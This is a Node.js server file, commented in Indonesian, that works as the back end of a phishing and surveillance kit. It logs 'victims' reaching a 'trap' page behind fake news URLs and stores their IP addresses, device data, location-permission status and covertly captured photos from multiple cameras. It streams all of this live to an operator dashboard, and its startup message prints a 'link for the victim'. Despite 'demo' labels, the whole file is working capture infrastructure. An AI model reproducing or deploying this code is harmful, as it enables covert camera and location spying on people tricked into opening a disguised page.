// server.js - VERSI DIPERBAIKI UNTUK MULTIPLE CAMERA

const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

// Middleware untuk CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization",
  );
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }
  next();
});

// Middleware untuk body parser
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// Buat folder captures jika belum ada
if (!fs.existsSync("captures")) {
  fs.mkdirSync("captures");
}

// Database sederhana
let victims = [];
let photos = {}; // Struktur: photos[victimId] = array of {image, cameraType, timestamp}

// ============= API ROUTES =============

// Endpoint untuk testing
app.get("/api/test", (req, res) => {
  res.json({ status: "ok", message: "Server is running" });
});

// API untuk menerima data (device info, location, dll)
app.post("/api/capture", (req, res) => {
  console.log("📥 Data received:", req.body);

  try {
    const data = req.body;

    if (!data || !data.victimId) {
      return res.status(400).json({ error: "Invalid data" });
    }

    data.timestamp = new Date().toISOString();
    data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const existingIndex = victims.findIndex(
      (v) => v.victimId === data.victimId,
    );

    if (existingIndex >= 0) {
      if (!victims[existingIndex].data) {
        victims[existingIndex].data = {};
      }

      if (data.type && data.data) {
        victims[existingIndex].data[data.type] = data.data;
      } else if (data.data) {
        victims[existingIndex].data = {
          ...victims[existingIndex].data,
          ...data.data,
        };
      }

      victims[existingIndex].timestamp = data.timestamp;
      victims[existingIndex].ip = data.ip;
    } else {
      const newVictim = {
        victimId: data.victimId,
        timestamp: data.timestamp,
        ip: data.ip,
        data: {},
      };

      if (data.type && data.data) {
        newVictim.data[data.type] = data.data;
      } else if (data.data) {
        newVictim.data = data.data;
      }

      victims.push(newVictim);
    }

    io.emit("new-victim", data);
    fs.appendFileSync("victims.log", JSON.stringify(data) + "\n");

    console.log(`✅ Data saved for victim: ${data.victimId}`);

    res.json({ status: "ok", message: "Data captured" });
  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk menerima gambar (DIPERBAIKI untuk multiple camera)
app.post("/api/capture-image", (req, res) => {
  console.log("📸 Received image upload request");

  try {
    const { image, victimId, cameraType, timestamp } = req.body;

    if (!image || !victimId) {
      console.log("❌ Missing image or victimId");
      return res.status(400).json({ error: "Invalid data" });
    }

    // Log ukuran gambar dan info kamera
    const cameraTypeStr = cameraType || "unknown";
    console.log(
      `📸 Image from ${victimId}, camera: ${cameraTypeStr}, size: ${image.length} chars`,
    );

    // Hapus header base64
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");

    // Simpan ke file dengan nama yang lebih informatif
    const filename = `captures/${victimId}_${cameraTypeStr}_${Date.now()}.jpg`;
    fs.writeFileSync(filename, base64Data, "base64");
    console.log(`✅ Image saved to ${filename}`);

    // ========== PERBAIKAN: Simpan di memory dengan struktur array ==========
    if (!photos[victimId]) {
      photos[victimId] = [];
    }

    const photoData = {
      image: image,
      cameraType: cameraTypeStr,
      timestamp: timestamp || new Date().toISOString(),
      filename: filename,
    };

    photos[victimId].push(photoData);

    // Hanya simpan maksimal 20 foto terakhir per victim
    if (photos[victimId].length > 20) {
      photos[victimId] = photos[victimId].slice(-20);
    }

    // Kirim ke dashboard
    io.emit("new-photo", {
      victimId,
      image: image,
      cameraType: cameraTypeStr,
      timestamp: photoData.timestamp,
    });

    console.log(
      `📤 Photo sent to dashboard for ${victimId} (${cameraTypeStr})`,
    );
    console.log(`📊 Total photos for ${victimId}: ${photos[victimId].length}`);

    res.json({ status: "ok", filename, cameraType: cameraTypeStr });
  } catch (error) {
    console.error("❌ Error saving image:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk mendapatkan foto spesifik (opsional)
app.get("/api/photos/:victimId", (req, res) => {
  const victimId = req.params.victimId;
  if (photos[victimId]) {
    res.json({
      victimId,
      photos: photos[victimId],
      count: photos[victimId].length,
    });
  } else {
    res.json({ victimId, photos: [], count: 0 });
  }
});

// API untuk membersihkan data (opsional untuk demo)
app.post("/api/clear-data", (req, res) => {
  try {
    victims = [];
    photos = {};

    // Kosongkan folder captures (opsional)
    const capturesDir = path.join(__dirname, "captures");
    const files = fs.readdirSync(capturesDir);
    for (const file of files) {
      fs.unlinkSync(path.join(capturesDir, file));
    }

    console.log("🗑️ All data cleared");
    io.emit("data-cleared");
    res.json({ status: "ok", message: "All data cleared" });
  } catch (error) {
    console.error("Error clearing data:", error);
    res.status(500).json({ error: error.message });
  }
});

// ============= STATIC FILES =============
app.use(
  express.static("public", {
    setHeaders: (res, path) => {
      if (path.endsWith(".html")) {
        res.setHeader("Cache-Control", "no-cache");
      }
    },
  }),
);

// ============= PAGE ROUTES =============
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.get("/demo", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "trap.html"));
});

app.get("/berita", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/artikel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/news", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/berita-terkini", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// ============= 404 HANDLER =============
app.use((req, res) => {
  if (req.path.startsWith("/api/")) {
    return res.status(404).json({ error: "API endpoint not found" });
  }
  if (req.path.includes(".")) {
    return res.status(404).send("File not found");
  }
  res.redirect("/berita");
});

// ============= SOCKET.IO =============
io.on("connection", (socket) => {
  console.log("📊 Dashboard terhubung");

  // Kirim statistik
  const totalVictims = victims.length;
  const cameraGranted = victims.filter(
    (v) => v.data?.camera_access?.status === "granted",
  ).length;
  const locationGranted = victims.filter(
    (v) => v.data?.location?.status === "granted",
  ).length;

  socket.emit("stats", {
    total: totalVictims,
    camera: cameraGranted,
    location: locationGranted,
  });

  // Kirim data victims yang sudah ada
  socket.emit("init-data", victims);

  // Kirim photos yang sudah ada (dengan struktur array)
  Object.keys(photos).forEach((victimId) => {
    // Kirim semua foto untuk victim ini
    photos[victimId].forEach((photo) => {
      socket.emit("new-photo", {
        victimId,
        image: photo.image,
        cameraType: photo.cameraType,
        timestamp: photo.timestamp,
      });
    });
  });

  console.log(
    `📊 Sent ${victims.length} victims and ${Object.keys(photos).length} photo records`,
  );
});

const PORT = 3000;
server.listen(PORT, "0.0.0.0", () => {
  console.log("\n🚀 Demo server running di:");
  console.log(`   - Local: http://localhost:${PORT}`);
  console.log(`   - Network: http://${getLocalIP()}:${PORT}`);
  console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
  console.log(`📊 Link dashboard: http://localhost:${PORT}`);
  console.log(`📰 Link berita: http://localhost:${PORT}/berita`);
  console.log(`🖼️  Folder captures: ${path.join(__dirname, "captures")}\n`);
});

// Helper untuk mendapatkan IP lokal
function getLocalIP() {
  const { networkInterfaces } = require("os");
  const nets = networkInterfaces();

  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}
